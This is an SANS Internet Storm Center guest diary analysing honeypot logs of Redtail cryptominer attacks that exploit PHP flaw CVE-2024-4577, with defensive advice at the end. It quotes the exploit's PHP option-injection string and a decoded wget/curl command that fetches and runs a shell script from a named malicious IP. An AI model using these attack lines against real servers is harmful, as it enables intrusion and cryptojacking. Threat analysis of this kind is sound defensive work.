---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-04-30T00:15:16.659040+00:00'
exported_at: '2026-04-30T00:15:19.180698+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/32936
structured_data:
  about: []
  author: ''
  description: 'Danger of Libredtail [Guest Diary], Author: Guy Bruneau'
  headline: Danger of Libredtail &#x5b;Guest Diary&#x5d;, (Wed, Apr 29th)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/32936
  publisher:
    logo: /favicon.ico
    name: GTCode
title: Danger of Libredtail &#x5b;Guest Diary&#x5d;, (Wed, Apr 29th)
updated_at: '2026-04-30T00:15:16.659040+00:00'
url_hash: 93c73468c020eae97b8444e459a6c4f76abf6a08
---

[This is a Guest Diary by James Roberts, an ISC intern as part of the SANS.edu
[BACS](https://www.sans.edu/cyber-security-programs/bachelors-degree/)
program]

Over the last few months, I have gained valuable experience working with the Internet Storm Center (ISC) operating a honeypot and analyzing its output via a
[SIEM](https://github.com/bruneaug/DShield-SIEM/blob/main/README.md)
environment.  This work gave me hands on experience with system set on a Raspberry Pi environment, utilizing command line interfaces, SIEM deployment, networking, and information analysis.  This experience was also a good demonstration of difficulty of finding useful information in a sea of logged data and how to find interesting items within it.  Some of the most interesting items were indicators relating to cryptomining malware.

**DShield Honeypot**

The DShield sensor is a honeypot system that information from HTTP, telnet, SSH, and firewall logs.  When deployed, it uses a Cowrie honeypot to simulate a Debian system to capture SSH and Telnet interactions, web.py and tcp-honeypot.py to simulate various services and obtain HTTP and TCP interactions, and finally scripts to collect, process and submit these and firewall logs.  These logs are sent to ISC, as well as an ELK SIEM that is set up on another system of mine.  With the SIEM, I was better able to parse, research, and understand the information produced by the various DShield logs.  Sometimes I would see something more interesting than just a standard SSH login attempt

**Identifying Something Interesting**

Around the halfway point in my internship, I did an attack observation about a type of cryptomining malware known as redtail.  After completing that observation, I noticed that there was another, different, variety of redtail based attacks I had previously not noticed, this time operating via HTTP instead of SSH/telnet.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic1(3).png)

As the most commonly occurring User Agent, and one of the most common items of HTTP information over the entire course of my DShield sensor’s deployment, I felt compelled to investigate further.

**Overview of the Culprits**

While I had 113 different IP addresses perform libertail-http activity on the DShield sensor, I am opting to focus my observation on the top three IP addresses for the sake of simplicity.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic2(1).png)

All three of these IP addresses attempted to perform the same attack multiple times over the course of several days.  The IP addresses came from different counties, Germany, Great Britain, and India.  All the observed libertail-http Ip addresses had similar general HTTP behavior, though there are some exceptions.  Most of the IP addresses observed additionally attempted to log in to the honeypot via SSH, as well as performing a SYN scan.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic3.png)

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic4.png)

IP addresses
82.165.66.87
and
103.40.61.98
are almost identical in their behavior, even both exclusively using the same Username/Password login combination (admin/admin).  It is likely all the attackers are actually bots, but these two are likely using the same script to perform the same probing activity.  Based on other information that will be seen later, they might actually be the same attacker using different IP addresses.  Their behaviors are also more representative of the behavior observed by other attackers.  IP address
2.27.53.96
is much more aggressive in its attempt to log in with SSH and is less aggressive about the number of ports it scans.  Much of its activity is still similar to the other observed IP addresses, but it is unique in some ways.

**Patterns of Behavior**

Each of the attacks begins with a series of four HTTP POST actions.

From IP 103.10.61.98 on March 27 0623UTC

http.request.body            http.response.body.content                      url.query

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic5.png)

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic6.png)

The first two POST actions are effectively the same, with the only difference being that the first one uses URL encoding to traverse to /bin/sh while the second one doesn’t.  This directory traversal is attempting to look for CGI misconfigurations and allow the use of /bin/sh for command execution.  Additionally there is an attempt to connect to 31.57.216.121/sh through wget and curl.  On March 3, similar behaviors were logged for
178.16.55.224/sh
instead.  IP address
82.165.66.87
also attempts to connect to both of these address as well and IP
2.27.53.96
additionally used
46.151.182.82
.  After connecting via SH to an address, apache.selfrep is run.  Based on the name, apache.selfrep is likely a script designed to maintain persistence on a target.  IPs
31.57.216.121
,
178.16.55.224
, and
46.151.182.82
are known malicious IP addresses associated with cyrptomining malware infrastructure.  The url.query is the request.body information in its more original state, which is in base64.  The base64 encoding was likely done to obfuscate the attack or to more reliably deliver the attack against a wider variety of system or both.

The next two POST actions related directly to CVE-2024-4577, an exploit strongly associated with redtail malware that targets PHP services.  The request body line ”: d+allow\_url\_include=1+ d+auto\_prepend\_file=php://input” takes advantage of older PHP versions  flaw of replacing certain characters given into something else using a “Best-Fit” behavior that misinterprets characters as PHP options and allows running arbitrary PHP code.  In this case, that arbitrary code is being used to the inclusion of extra input from the HTTP request body.  That request body input accesses shell.exe and sends a base64 encoded set of commands

“
KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw
”.  This can be decoded into (wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s cve\_2024\_4577.selfrep). This is very similar commands found in the previous POST commands, running cve\_2024\_4577.selfrep as a different script.  Additionally, echo(md5("Hello CVE-2024-4577") is also run to print a message to indicate the previous commands have run correctly.  Like the other POST actions, the original query was encoded in base64.

Next the attack begins probing various .php installation paths.  The paths are requested, with “<?php echo(md5("Hello PHPUnit"));” created as a response if the requested path is found.  This reconnaissance is likely being done to map out what specific type of PHP is available and by extension what other vulnerabilities could be utilized in the future.

From IP 82.165.66.87 on March 27 12:55 UTC

http.request.body.content                                             http.response.body.content

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic7.png)

In addition to the HTTP interactions, the IP addresses also attempt to interact with the honeypot by logging on via SSH and engaging in SYN scans on various ephemeral ports.  If a SSH login is successful, there are no attempts to run other commands.  The logins and port scans typically hours before or after the HTTP actions and are likely the bot engaging in those probing actions independently from anything related in HTTP.  The SYN scans consistently produced failures for the scanned ports.

**From IP 2.27.53.96**

Timestamp                               Source IP                                        Source port/outcome

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic8.png)

**Redtail Cryptomining Malware**

While the attack engaged in several actions, perhaps the most important was running cve\_2024\_4577.selfrep.  That script is performs several actions, such as finding out about system architecture, finding directories to write new files, searching cronjobs relating to other cryptominers and stopping their services, and installing an appropriate version of redtail and naming it ‘.redtail’ to make it a hidden file.  The versions of redtail are x86\_64, i686, aarch64, and arm7.  While redtail cryptominers have been part of the threat landscape since 2023, libredtail-http and CVE-2024-4577 started appearing later in mid 2024.

![](https://isc.sans.edu/diaryimages/images/James_Roberts_pic9.png)

**How to Protect against Redtail**

Protection and remediation, why it matters

There are many things that can be done to protect against this type of attack.  If possible, patching to a more current version on PHP can help.  Writing a rule to block the libredtail-http user-agent on a WAF, reverse proxy, IPS, host firewall, or a tool like Fail2Ban could block the types of attacks seen here.  Rules could probably also be made to block traffic involving IP any variation of ip.ip.ip.ip/sh, something seen and these attacks and rarely ever seen in legitimate traffic.  Given the volume of http traffic created, monitoring the network activity for unusual behavior could help discover a compromise.  Setting up SSH shared keys or authentication against another server could help protect a system against unwanted SSH login attempts.

[1] https://isc.sans.edu/honeypot.html

[2] https://github.com/cowrie/cowrie

[3] https://infosecwriteups.com/honeypots-102-setting-up-a-sans-internet-storm-centers-dshield-honeypot-1ec1774bd949

[4] https://github.com/bruneaug/DShield-SIEM/blob/main/README.md

[5] https://192.168.80.139/app/dashboards#/view/d525c518-3e97-4375-9e38-ded8f18934a4?\_g=(filters:!(),time:(from:now-90d%2Fd,to:now))

[6] https://www.joesandbox.com/analysis/1851676/0/html

[7] https://www.joesandbox.com/analysis/1890665/0/html

[8] https://www.joesandbox.com/analysis/1893948/0/html

[9] https://www.socdefenders.ai/threats/b91c3aa2-d17d-4621-8f76-99e3226bdecb

[10] https://nvd.nist.gov/vuln/detail/CVE-2024-4577

[11] https://www.forescout.com/blog/new-redtail-malware-exploited-via-php-security-vulnerability/

[12] https://roccosicilia.com/2025/07/15/cve-2024-4577-payload-analysis/

[13] https://www.sans.edu/cyber-security-programs/bachelors-degree/

-----------

Guy Bruneau
[IPSS Inc.](http://www.ipss.ca/)

[My GitHub Page](https://github.com/bruneaug/)

Twitter:
[GuyBruneau](https://twitter.com/guybruneau)

gbruneau at isc dot sans dot edu